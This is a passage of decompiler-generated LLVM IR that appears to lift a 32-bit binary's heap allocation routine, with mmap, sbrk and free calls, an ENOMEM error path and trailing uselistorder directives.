  %v10_804c477 = icmp eq i32 %v1_804c46c, -1
  store i32 %v1_804c46c, i32* @ebx, align 4
  %v1_804c47c = icmp eq i1 %v10_804c477, false
  br i1 %v1_804c47c, label %dec_label_pc_804c4d5, label %dec_label_pc_804c468.dec_label_pc_804c47e_crit_edge

dec_label_pc_804c468.dec_label_pc_804c47e_crit_edge: ; preds = %dec_label_pc_804c468
  %v0_804c47e.pre = load i8, i8* @global_var_80561a0.358, align 32
  br label %dec_label_pc_804c47e

dec_label_pc_804c47e:                             ; preds = %dec_label_pc_804c468.dec_label_pc_804c47e_crit_edge, %dec_label_pc_804c42a
  %v0_804c4ab = phi i32 [ -1, %dec_label_pc_804c468.dec_label_pc_804c47e_crit_edge ], [ %v1_804c45c, %dec_label_pc_804c42a ]
  %v0_804c47e = phi i8 [ %v0_804c47e.pre, %dec_label_pc_804c468.dec_label_pc_804c47e_crit_edge ], [ %v0_804c44a, %dec_label_pc_804c42a ]
  %v1_804c47e = urem i8 %v0_804c47e, 2
  %v2_804c47e = icmp eq i8 %v1_804c47e, 0
  br i1 %v2_804c47e, label %dec_label_pc_804c47e.dec_label_pc_804c493_crit_edge, label %dec_label_pc_804c487

dec_label_pc_804c47e.dec_label_pc_804c493_crit_edge: ; preds = %dec_label_pc_804c47e
  %v0_804c493.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c493

dec_label_pc_804c487:                             ; preds = %dec_label_pc_804c47e
  %v2_804c48b = add i32 %v1_804c43a, %v1_804c34c
  store i32 %v2_804c48b, i32* %eax.global-to-local, align 4
  %v0_804c48d = load i32, i32* @esi, align 4
  %v2_804c48d = add i32 %v0_804c48d, %v2_804c48b
  %v5_804c48f = and i32 %v2_804c48d, %v1_804c45c
  store i32 %v5_804c48f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c493

dec_label_pc_804c493:                             ; preds = %dec_label_pc_804c47e.dec_label_pc_804c493_crit_edge, %dec_label_pc_804c487
  %v3_804c49e = phi i32 [ %v0_804c493.pre, %dec_label_pc_804c47e.dec_label_pc_804c493_crit_edge ], [ %v5_804c48f, %dec_label_pc_804c487 ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_804c49e, 1048576
  %v5_804c49e = select i1 %tmp88, i32 1048576, i32 %v3_804c49e
  store i32 %v5_804c49e, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_804c49e, %v1_804c372
  br i1 %tmp141, label %dec_label_pc_804c4ab, label %dec_label_pc_804c6f0

dec_label_pc_804c4ab:                             ; preds = %dec_label_pc_804c493
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804c4b8 = call i32 @mmap(i32 0, i32 %v5_804c49e, i32 3, i32 34, i32 0, i32 0, i32 %v0_804c4ab, i32 %v0_804c4ab)
  store i32 %v8_804c4b8, i32* %eax.global-to-local, align 4
  %v10_804c4c0 = icmp eq i32 %v8_804c4b8, -1
  store i32 %v8_804c4b8, i32* @ebx, align 4
  br i1 %v10_804c4c0, label %dec_label_pc_804c6f0, label %dec_label_pc_804c4cb

dec_label_pc_804c4cb:                             ; preds = %dec_label_pc_804c4ab
  %v0_804c4cb = load i8, i8* @global_var_80561a0.358, align 1
  %v2_804c4cb = and i8 %v0_804c4cb, -2
  store i8 %v2_804c4cb, i8* @global_var_80561a0.358, align 32
  %v1_804c4d2 = load i32, i32* @esi, align 4
  %v2_804c4d2 = add i32 %v1_804c4d2, %v8_804c4b8
  store i32 %v2_804c4d2, i32* @edx, align 4
  br label %dec_label_pc_804c4d5

dec_label_pc_804c4d5:                             ; preds = %dec_label_pc_804c468, %dec_label_pc_804c4cb
  %v0_804c59c = phi i32 [ -1, %dec_label_pc_804c468 ], [ %v2_804c4d2, %dec_label_pc_804c4cb ]
  %v0_804c5aa = phi i32 [ %v1_804c46c, %dec_label_pc_804c468 ], [ %v8_804c4b8, %dec_label_pc_804c4cb ]
  %v10_804c4d5 = icmp eq i32 %v0_804c5aa, -1
  br i1 %v10_804c4d5, label %dec_label_pc_804c6f0, label %dec_label_pc_804c4de

dec_label_pc_804c4de:                             ; preds = %dec_label_pc_804c4d5
  %v0_804c4e2 = load i32, i32* @global_var_80561a8.355, align 8
  %v1_804c4e2 = load i32, i32* @esi, align 4
  %v2_804c4e2 = add i32 %v1_804c4e2, %v0_804c4e2
  store i32 %v2_804c4e2, i32* @global_var_80561a8.355, align 8
  %v2_804c4e8 = add i32 %v1_804c43a, %v0_804c42a
  store i32 %v2_804c4e8, i32* %ecx.global-to-local, align 4
  %v2_804c4ea = sub i32 %v0_804c5aa, %v2_804c4e8
  %v7_804c4ea = icmp ult i32 %v0_804c5aa, %v2_804c4e8
  %v12_804c4ea = icmp eq i32 %v2_804c4ea, 0
  %v1_804c4ec = icmp eq i1 %v12_804c4ea, false
  br i1 %v1_804c4ec, label %dec_label_pc_804c505, label %dec_label_pc_804c4ee

dec_label_pc_804c4ee:                             ; preds = %dec_label_pc_804c4de
  %v10_804c4ee = icmp eq i32 %v0_804c59c, -1
  %v1_804c4f1 = icmp eq i1 %v10_804c4ee, false
  br i1 %v1_804c4f1, label %dec_label_pc_804c505, label %dec_label_pc_804c4f3

dec_label_pc_804c4f3:                             ; preds = %dec_label_pc_804c4ee
  store i32 %v0_804c42a, i32* %ecx.global-to-local, align 4
  %v2_804c4f7 = add i32 %v1_804c4e2, %v1_804c43a
  %v1_804c4fa = or i32 %v2_804c4f7, 1
  store i32 %v1_804c4fa, i32* %eax.global-to-local, align 4
  store i32 %v1_804c4fa, i32* %v2_804c433, align 4
  br label %dec_label_pc_804c632

dec_label_pc_804c505:                             ; preds = %dec_label_pc_804c4ee, %dec_label_pc_804c4de
  %v0_804c505 = load i8, i8* @global_var_80561a0.358, align 1
  %v1_804c505 = sext i8 %v0_804c505 to i32
  store i32 %v1_804c505, i32* %eax.global-to-local, align 4
  %v2_804c50a = urem i8 %v0_804c505, 2
  %v3_804c50a = icmp eq i8 %v2_804c50a, 0
  br i1 %v3_804c50a, label %dec_label_pc_804c51e, label %dec_label_pc_804c50e

dec_label_pc_804c50e:                             ; preds = %dec_label_pc_804c505
  br i1 %v2_804c43a, label %dec_label_pc_804c51e, label %dec_label_pc_804c512

dec_label_pc_804c512:                             ; preds = %dec_label_pc_804c50e
  %v1_804c514 = icmp eq i1 %v7_804c4ea, false
  br i1 %v1_804c514, label %dec_label_pc_804c51e, label %dec_label_pc_804c516

dec_label_pc_804c516:                             ; preds = %dec_label_pc_804c512
  %v1_804c516 = and i32 %v1_804c505, -2
  %v4_804c516 = trunc i32 %v1_804c516 to i8
  store i32 %v1_804c516, i32* %eax.global-to-local, align 4
  store i8 %v4_804c516, i8* @global_var_80561a0.358, align 32
  br label %dec_label_pc_804c51e

dec_label_pc_804c51e:                             ; preds = %dec_label_pc_804c512, %dec_label_pc_804c50e, %dec_label_pc_804c505, %dec_label_pc_804c516
  %v0_804c51e = phi i8 [ %v0_804c505, %dec_label_pc_804c512 ], [ %v0_804c505, %dec_label_pc_804c50e ], [ %v0_804c505, %dec_label_pc_804c505 ], [ %v4_804c516, %dec_label_pc_804c516 ]
  %v1_804c51e = urem i8 %v0_804c51e, 2
  %v2_804c51e = icmp eq i8 %v1_804c51e, 0
  br i1 %v2_804c51e, label %dec_label_pc_804c59c, label %dec_label_pc_804c527

dec_label_pc_804c527:                             ; preds = %dec_label_pc_804c51e
  br i1 %v2_804c43a, label %dec_label_pc_804c535, label %dec_label_pc_804c52b

dec_label_pc_804c52b:                             ; preds = %dec_label_pc_804c527
  store i32 %v2_804c4ea, i32* %eax.global-to-local, align 4
  %v2_804c52f = add i32 %v2_804c4e2, %v2_804c4ea
  store i32 %v2_804c52f, i32* @global_var_80561a8.355, align 8
  br label %dec_label_pc_804c535

dec_label_pc_804c535:                             ; preds = %dec_label_pc_804c527, %dec_label_pc_804c52b
  %v1_804c537 = urem i32 %v0_804c5aa, 8
  %v2_804c537 = icmp eq i32 %v1_804c537, 0
  store i32 %v1_804c537, i32* %edx.global-to-local, align 4
  %v1_804c53a = icmp eq i1 %v2_804c537, false
  br i1 %v1_804c53a, label %dec_label_pc_804c542, label %dec_label_pc_804c53c

dec_label_pc_804c53c:                             ; preds = %dec_label_pc_804c535
  store i32 %v0_804c5aa, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c54c

dec_label_pc_804c542:                             ; preds = %dec_label_pc_804c535
  %v2_804c547 = sub nsw i32 8, %v1_804c537
  store i32 %v2_804c547, i32* %eax.global-to-local, align 4
  %v2_804c549 = add i32 %v2_804c547, %v0_804c5aa
  store i32 %v2_804c549, i32* @edi, align 4
  br label %dec_label_pc_804c54c

dec_label_pc_804c54c:                             ; preds = %dec_label_pc_804c53c, %dec_label_pc_804c542
  %v0_804c559 = phi i32 [ 0, %dec_label_pc_804c53c ], [ %v2_804c547, %dec_label_pc_804c542 ]
  %v2_804c54c = add i32 %v1_804c4e2, %v0_804c5aa
  %v2_804c559 = add i32 %v0_804c559, %v1_804c43a
  store i32 %v2_804c559, i32* %ecx.global-to-local, align 4
  %v2_804c55c = add i32 %v2_804c559, %v2_804c54c
  store i32 %v2_804c55c, i32* %edx.global-to-local, align 4
  %v2_804c55e = add i32 %v2_804c55c, %v1_804c34c
  %v5_804c561 = and i32 %v2_804c55e, %v1_804c45c
  %v2_804c568 = sub i32 %v5_804c561, %v2_804c55c
  store i32 %v2_804c568, i32* %eax.global-to-local, align 4
  %v2_804c56a = add i32 %v2_804c568, %v2_804c559
  store i32 %v2_804c56a, i32* @esi, align 4
  store i32 %v2_804c56a, i32* %stack_var_-92, align 4
  %v1_804c56e = call i32 @__GI_sbrk(i32 %v2_804c56a)
  store i32 %v1_804c56e, i32* %eax.global-to-local, align 4
  %v10_804c576 = icmp eq i32 %v1_804c56e, -1
  store i32 %v1_804c56e, i32* %edx.global-to-local, align 4
  %v1_804c57b = icmp eq i1 %v10_804c576, false
  br i1 %v1_804c57b, label %dec_label_pc_804c58b, label %dec_label_pc_804c57d

dec_label_pc_804c57d:                             ; preds = %dec_label_pc_804c54c
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804c582 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804c582, i32* %eax.global-to-local, align 4
  store i32 %v1_804c582, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c5bf

dec_label_pc_804c58b:                             ; preds = %dec_label_pc_804c54c
  %v1_804c58b = load i32, i32* @ebx, align 4
  %v7_804c58b = icmp ult i32 %v1_804c56e, %v1_804c58b
  %v1_804c58d = icmp eq i1 %v7_804c58b, false
  br i1 %v1_804c58d, label %dec_label_pc_804c5c4, label %dec_label_pc_804c58f

dec_label_pc_804c58f:                             ; preds = %dec_label_pc_804c58b
  %v0_804c58f = load i8, i8* @global_var_80561a0.358, align 1
  %v2_804c58f = and i8 %v0_804c58f, -2
  store i8 %v2_804c58f, i8* @global_var_80561a0.358, align 32
  store i32 %v2_804c54c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c5a3

dec_label_pc_804c59c:                             ; preds = %dec_label_pc_804c51e
  %v10_804c59c = icmp eq i32 %v0_804c59c, -1
  br i1 %v10_804c59c, label %dec_label_pc_804c5a7, label %dec_label_pc_804c5a1

dec_label_pc_804c5a1:                             ; preds = %dec_label_pc_804c59c
  store i32 %v0_804c5aa, i32* @edi, align 4
  br label %dec_label_pc_804c5a3

dec_label_pc_804c5a3:                             ; preds = %dec_label_pc_804c58f, %dec_label_pc_804c5a1
  %v0_804c5c447 = phi i32 [ %v2_804c54c, %dec_label_pc_804c58f ], [ %v0_804c59c, %dec_label_pc_804c5a1 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804c5c4

dec_label_pc_804c5a7:                             ; preds = %dec_label_pc_804c59c
  store i32 %v0_804c5aa, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804c5ae = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804c5ae, i32* %edx.global-to-local, align 4
  %v1_804c5b5 = load i32, i32* @ebx, align 4
  %v2_804c5b5 = sub i32 %v1_804c5ae, %v1_804c5b5
  %v1_804c5b7 = load i32, i32* @esi, align 4
  %v2_804c5b7 = sub i32 %v2_804c5b5, %v1_804c5b7
  store i32 %v2_804c5b7, i32* %eax.global-to-local, align 4
  %v0_804c5b9 = load i32, i32* @global_var_80561a8.355, align 8
  %v2_804c5b9 = add i32 %v0_804c5b9, %v2_804c5b7
  store i32 %v2_804c5b9, i32* @global_var_80561a8.355, align 8
  br label %dec_label_pc_804c5bf

dec_label_pc_804c5bf:                             ; preds = %dec_label_pc_804c57d, %dec_label_pc_804c5a7
  %v0_804c5c446 = phi i32 [ %v1_804c582, %dec_label_pc_804c57d ], [ %v1_804c5ae, %dec_label_pc_804c5a7 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804c5c4

dec_label_pc_804c5c4:                             ; preds = %dec_label_pc_804c58b, %dec_label_pc_804c5a3, %dec_label_pc_804c5bf
  %v0_804c5c9 = phi i32 [ %v1_804c56e, %dec_label_pc_804c58b ], [ %v0_804c5c447, %dec_label_pc_804c5a3 ], [ %v0_804c5c446, %dec_label_pc_804c5bf ]
  %v10_804c5c4 = icmp eq i32 %v0_804c5c9, -1
  br i1 %v10_804c5c4, label %dec_label_pc_804c632, label %dec_label_pc_804c5c9

dec_label_pc_804c5c9:                             ; preds = %dec_label_pc_804c5c4
  %v1_804c5c9 = load i32, i32* @edi, align 4
  %v2_804c5c9 = sub i32 %v0_804c5c9, %v1_804c5c9
  store i32 %v2_804c5c9, i32* %edx.global-to-local, align 4
  %v1_804c5cb = load i32, i32* @esi, align 4
  %v2_804c5cb = add i32 %v1_804c5cb, %v2_804c5c9
  %v1_804c5ce = or i32 %v2_804c5cb, 1
  store i32 %v1_804c5ce, i32* %eax.global-to-local, align 4
  store i32 %v1_804c5c9, i32* @global_var_8055e6c.343, align 4
  %v2_804c5d7 = add i32 %v1_804c5c9, 4
  %v3_804c5d7 = inttoptr i32 %v2_804c5d7 to i32*
  store i32 %v1_804c5ce, i32* %v3_804c5d7, align 4
  %v0_804c5da = load i32, i32* @global_var_80561a8.355, align 8
  %v1_804c5da = load i32, i32* @esi, align 4
  %v2_804c5da = add i32 %v1_804c5da, %v0_804c5da
  store i32 %v2_804c5da, i32* @global_var_80561a8.355, align 8
  br i1 %v2_804c43a, label %dec_label_pc_804c632, label %dec_label_pc_804c5e4

dec_label_pc_804c5e4:                             ; preds = %dec_label_pc_804c5c9
  store i32 %v0_804c42a, i32* %ecx.global-to-local, align 4
  %v1_804c5e8 = add i32 %v1_804c43a, -12
  %v1_804c5eb = and i32 %v1_804c5e8, -8
  store i32 %v1_804c5eb, i32* %eax.global-to-local, align 4
  %v1_804c5f0 = or i32 %v1_804c5eb, 1
  store i32 %v1_804c5f0, i32* %edx.global-to-local, align 4
  %v5_804c5f3 = icmp ult i32 %v1_804c5eb, 15
  store i32 %v1_804c5f0, i32* %v2_804c433, align 4
  %v0_804c5f9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c5f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c5f9 = add i32 %v0_804c5f9, 4
  %v3_804c5f9 = add i32 %v2_804c5f9, %v1_804c5f9
  %v4_804c5f9 = inttoptr i32 %v3_804c5f9 to i32*
  store i32 5, i32* %v4_804c5f9, align 4
  %v0_804c601 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c601 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c601 = add i32 %v0_804c601, 8
  %v3_804c601 = add i32 %v2_804c601, %v1_804c601
  %v4_804c601 = inttoptr i32 %v3_804c601 to i32*
  store i32 5, i32* %v4_804c601, align 4
  br i1 %v5_804c5f3, label %dec_label_pc_804c632, label %dec_label_pc_804c60b

dec_label_pc_804c60b:                             ; preds = %dec_label_pc_804c5e4
  %v0_804c60b = load i32, i32* @global_var_8056184.359, align 4
  store i32 %v0_804c60b, i32* @ebx, align 4
  %v0_804c611 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c616 = add i32 %v0_804c611, 8
  store i32 %v1_804c616, i32* %eax.global-to-local, align 4
  store i32 %v1_804c616, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8056184.359, align 4
  %v1_804c624 = call i32 @free(i32 %v1_804c616)
  store i32 %v1_804c624, i32* %eax.global-to-local, align 4
  %v0_804c62c = load i32, i32* @ebx, align 4
  store i32 %v0_804c62c, i32* @global_var_8056184.359, align 4
  br label %dec_label_pc_804c632

dec_label_pc_804c632:                             ; preds = %dec_label_pc_804c5e4, %dec_label_pc_804c5c9, %dec_label_pc_804c5c4, %dec_label_pc_804c4f3, %dec_label_pc_804c60b
  %v0_804c632 = load i32, i32* @global_var_80561a8.355, align 8
  %v0_804c637 = load i32, i32* @global_var_80561ac.360, align 4
  %v0_804c643 = load i32, i32* @global_var_8055e6c.343, align 4
  store i32 %v0_804c643, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_804c632, %v0_804c637
  %v5_804c649 = select i1 %tmp89, i32 %v0_804c637, i32 %v0_804c632
  store i32 %v5_804c649, i32* @edx, align 4
  %v1_804c64c = load i32, i32* @global_var_80561a4.354, align 4
  %v2_804c64c = add i32 %v1_804c64c, %v0_804c632
  store i32 %v5_804c649, i32* @global_var_80561ac.360, align 4
  %v1_804c658 = load i32, i32* @global_var_80561b4.356, align 4
  %tmp90 = icmp ule i32 %v2_804c64c, %v1_804c658
  %v5_804c65e = select i1 %tmp90, i32 %v1_804c658, i32 %v2_804c64c
  store i32 %v5_804c65e, i32* %eax.global-to-local, align 4
  store i32 %v5_804c65e, i32* @global_var_80561b4.356, align 4
  %v1_804c66a = add i32 %v0_804c643, 4
  %v2_804c66a = inttoptr i32 %v1_804c66a to i32*
  %v3_804c66a = load i32, i32* %v2_804c66a, align 4
  %v1_804c66d = and i32 %v3_804c66a, -4
  store i32 %v1_804c66d, i32* @ecx, align 4
  %v10_804c670 = icmp ult i32 %v1_804c66d, %v1_804c2ea
  br i1 %v10_804c670, label %dec_label_pc_804c6f0, label %dec_label_pc_804c676

dec_label_pc_804c676:                             ; preds = %dec_label_pc_804c632
  store i32 %v1_804c372, i32* %esi.global-to-local, align 4
  %v2_804c67c = sub i32 %v1_804c66d, %v1_804c372
  store i32 %v2_804c67c, i32* %ecx.global-to-local, align 4
  %v2_804c67e = add i32 %v0_804c643, %v1_804c372
  store i32 %v2_804c67e, i32* @edx, align 4
  %v1_804c681 = or i32 %v1_804c372, 1
  store i32 %v1_804c681, i32* %eax.global-to-local, align 4
  store i32 %v2_804c67e, i32* @global_var_8055e6c.343, align 4
  store i32 %v1_804c681, i32* %v2_804c66a, align 4
  %v0_804c68d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c68d

dec_label_pc_804c68d:                             ; preds = %dec_label_pc_804c2f8, %dec_label_pc_804c676
  %v0_804c68d = phi i32 [ %v5_804c30b, %dec_label_pc_804c2f8 ], [ %v0_804c68d.pre, %dec_label_pc_804c676 ]
  %v1_804c68d = or i32 %v0_804c68d, 1
  store i32 %v1_804c68d, i32* @ecx, align 4
  %v0_804c690 = load i32, i32* @ebx, align 4
  %v1_804c690 = add i32 %v0_804c690, 8
  store i32 %v1_804c690, i32* %ebx.global-to-local, align 4
  %v1_804c693 = load i32, i32* @edx, align 4
  %v2_804c693 = add i32 %v1_804c693, 4
  %v3_804c693 = inttoptr i32 %v2_804c693 to i32*
  store i32 %v1_804c68d, i32* %v3_804c693, align 4
  br label %dec_label_pc_804c6fd

dec_label_pc_804c698:                             ; preds = %dec_label_pc_804c0aa
  %v5_804c69e = sub i32 %v1_804c08d, %v1_804c372
  store i32 %v5_804c69e, i32* %eax.global-to-local, align 4
  %v2_804c6a2 = add i32 %v0_804c158118, %v1_804c372
  store i32 %v2_804c6a2, i32* @edx, align 4
  %v1_804c6a6 = or i32 %v1_804c372, 1
  store i32 %v2_804c6a2, i32* @global_var_8055e70.344, align 16
  store i32 %v1_804c6a6, i32* %v2_804c087, align 4
  %v0_804c6b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6b4 = or i32 %v0_804c6b2, 1
  store i32 %v1_804c6b4, i32* @ecx, align 4
  %v0_804c6b7 = load i32, i32* @edx, align 4
  store i32 %v0_804c6b7, i32* @global_var_8055e7c.361, align 4
  store i32 %v0_804c6b7, i32* @global_var_8055e80.346, align 128
  %v1_804c6c3 = add i32 %v0_804c6b7, 8
  %v2_804c6c3 = inttoptr i32 %v1_804c6c3 to i32*
  store i32 ptrtoint (i32* @global_var_8055e74.345 to i32), i32* %v2_804c6c3, align 4
  %v0_804c6ca = load i32, i32* @edx, align 4
  %v1_804c6ca = add i32 %v0_804c6ca, 12
  %v2_804c6ca = inttoptr i32 %v1_804c6ca to i32*
  store i32 ptrtoint (i32* @global_var_8055e74.345 to i32), i32* %v2_804c6ca, align 4
  %v0_804c6d1 = load i32, i32* @ecx, align 4
  %v1_804c6d1 = load i32, i32* @edx, align 4
  %v2_804c6d1 = add i32 %v1_804c6d1, 4
  %v3_804c6d1 = inttoptr i32 %v2_804c6d1 to i32*
  store i32 %v0_804c6d1, i32* %v3_804c6d1, align 4
  %v0_804c6d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6d4 = load i32, i32* @edx, align 4
  %v3_804c6d4 = add i32 %v1_804c6d4, %v0_804c6d4
  %v4_804c6d4 = inttoptr i32 %v3_804c6d4 to i32*
  store i32 %v0_804c6d4, i32* %v4_804c6d4, align 4
  br label %dec_label_pc_804c6e2

dec_label_pc_804c6d9:                             ; preds = %dec_label_pc_804c0b9
  store i32 %v1_804c372, i32* %ebx.global-to-local, align 4
  %v0_804c6dd = load i32, i32* @ebp, align 4
  %v2_804c6dd = or i32 %v1_804c372, 4
  %v3_804c6dd = add i32 %v0_804c6dd, %v2_804c6dd
  %v4_804c6dd = inttoptr i32 %v3_804c6dd to i32*
  %v5_804c6dd = load i32, i32* %v4_804c6dd, align 4
  %v6_804c6dd = or i32 %v5_804c6dd, 1
  store i32 %v6_804c6dd, i32* %v4_804c6dd, align 4
  br label %dec_label_pc_804c6e2

dec_label_pc_804c6e2:                             ; preds = %dec_label_pc_804c698, %dec_label_pc_804c6d9
  %v0_804c6e2 = load i32, i32* @ebp, align 4
  %v1_804c6e2 = add i32 %v0_804c6e2, 8
  store i32 %v1_804c6e2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c6fd

dec_label_pc_804c6e7:                             ; preds = %dec_label_pc_804c1a9
  %v1_804c6e7 = load i32, i32* @ebx, align 4
  %v2_804c6e7 = add i32 %v0_804c1b5, 4
  %v3_804c6e7 = add i32 %v2_804c6e7, %v1_804c6e7
  %v4_804c6e7 = inttoptr i32 %v3_804c6e7 to i32*
  %v5_804c6e7 = load i32, i32* %v4_804c6e7, align 4
  %v6_804c6e7 = or i32 %v5_804c6e7, 1
  store i32 %v6_804c6e7, i32* %v4_804c6e7, align 4
  br label %dec_label_pc_804c6ec

dec_label_pc_804c6ec:                             ; preds = %dec_label_pc_804c1c1, %dec_label_pc_804c6e7
  %v0_804c6ec = load i32, i32* @ecx, align 4
  store i32 %v0_804c6ec, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c6fd

dec_label_pc_804c6f0:                             ; preds = %dec_label_pc_804c493, %dec_label_pc_804c632, %dec_label_pc_804c4d5, %dec_label_pc_804c4ab
  %v0_804c6f0 = load i32, i32* %stack_var_-92, align 4
  %v1_804c6f0 = call i32 @__errno_location(i32 %v0_804c6f0)
  store i32 %v1_804c6f0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804c6f7 = inttoptr i32 %v1_804c6f0 to i32*
  store i32 12, i32* %v1_804c6f7, align 4
  br label %dec_label_pc_804c6fd

dec_label_pc_804c6fd:                             ; preds = %dec_label_pc_804c6ec, %dec_label_pc_804c6e2, %dec_label_pc_804c68d, %dec_label_pc_804c323, %dec_label_pc_804c2d5, %dec_label_pc_804c054, %dec_label_pc_804c6f0
  store i32 %v2_804bf8b, i32* @eax, align 4
  store i32 %v2_804bf8b, i32* %stack_var_-92, align 4
  %v2_804c706 = call i32 @__pthread_return_void(i32 %v2_804bf8b, i32 1)
  store i32 %v2_804c706, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c70e

dec_label_pc_804c70e:                             ; preds = %dec_label_pc_804bfa9, %dec_label_pc_804c6fd
  %v0_804c711 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c711, i32* %eax.global-to-local, align 4
  %v2_804c713 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c713, i32* @ebx, align 4
  store i32 %v0_804bf78, i32* @esi, align 4
  store i32 %v0_804bf77, i32* @edi, align 4
  store i32 %v0_804bf76, i32* @ebp, align 4
  ret i32 %v0_804c711

; uselistorder directives
  uselistorder i32 %v0_804c6d4, { 1, 0 }
  uselistorder i32 %v1_804c658, { 1, 0 }
  uselistorder i32 %v2_804c64c, { 1, 0 }
  uselistorder i32 %v0_804c637, { 1, 0 }
  uselistorder i32 %v0_804c632, { 0, 2, 1 }
  uselistorder i32 %v1_804c5c9, { 1, 0, 2 }
  uselistorder i32 %v0_804c5c9, { 1, 0 }
  uselistorder i32 %v2_804c5b7, { 1, 0 }
  uselistorder i32 %v1_804c56e, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_804c55c, { 1, 0, 2 }
  uselistorder i32 %v2_804c54c, { 1, 2, 0 }
  uselistorder i32 %v2_804c547, { 1, 0, 2 }
  uselistorder i32 %v1_804c537, { 2, 1, 0 }
  uselistorder i8 %v0_804c505, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804c4e8, { 1, 0, 2 }
  uselistorder i32 %v0_804c5aa, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_804c59c, { 2, 0, 1 }
  uselistorder i32 %v8_804c4b8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_804c49e, { 1, 0, 2 }
  uselistorder i32 %v3_804c49e, { 1, 0 }
  uselistorder i32 %v1_804c46c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804c460, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804c45c, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804c44a, { 1, 0 }
  uselistorder i32 %v1_804c43a, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_804c42a, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_804c413, { 1, 0 }
  uselistorder i32 %v2_804c407, { 1, 0 }
  uselistorder i32 %v2_804c3f7, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804c3db, { 1, 2, 0 }
  uselistorder i32 %v1_804c3db, { 1, 0, 2 }
  uselistorder i32 %v1_804c3da, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804c3d4, { 1, 0 }
  uselistorder i32 %v2_804c3b2, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804c3a6, { 2, 1, 0 }
  uselistorder i32 %v8_804c391, { 5, 4, 2, 1, 3, 0, 6 }
  uselistorder i32 %v2_804c378, { 1, 0, 2 }
  uselistorder i32 %v0_804c31b, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804c2ea, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804c2dd, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804c2c3, { 1, 0, 2 }
  uselistorder i32 %v1_804c25d, { 1, 0 }
  uselistorder i32 %v3_804c252, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_804c24c, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804c24912, { 1, 0 }
  uselistorder i32 %v2_804c23e, { 1, 0 }
  uselistorder i32 %v1_804c222, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804c21e, { 2, 1, 0 }
  uselistorder i32 %v1_804c21a, { 1, 0 }
  uselistorder i32 %v1_804c215, { 2, 1, 0 }
  uselistorder i32 %v2_804c204, { 1, 0 }
  uselistorder i32 %v1_804c201, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804c19f, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_804c1ea, { 1, 0 }
  uselistorder i32 %v0_804c1b5, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804c18b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804c158, { 0, 2, 1 }
  uselistorder i32 %v2_804c13c, { 1, 0 }
  uselistorder i32 %v1_804c132, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804c12d.lcssa, { 1, 0 }
  uselistorder i32 %v3_804c11d, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804c114, { 1, 0, 2 }
  uselistorder i32 %v3_804c0f7, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_804c0f0, { 1, 0, 2 }
  uselistorder i32 %v2_804c0d8, { 2, 1, 0 }
  uselistorder i32 %v0_804c0c4, { 2, 1, 3, 0 }
  uselistorder i32 %v3_804c08a, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804c158118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804c158109, { 1, 0, 2 }
  uselistorder i32 %v3_804c037, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804c029, { 2, 1, 0 }
  uselistorder i32 %v2_804c004, { 2, 1, 0 }
  uselistorder i8 %v0_804bfd2, { 3, 1, 2, 0, 4 }
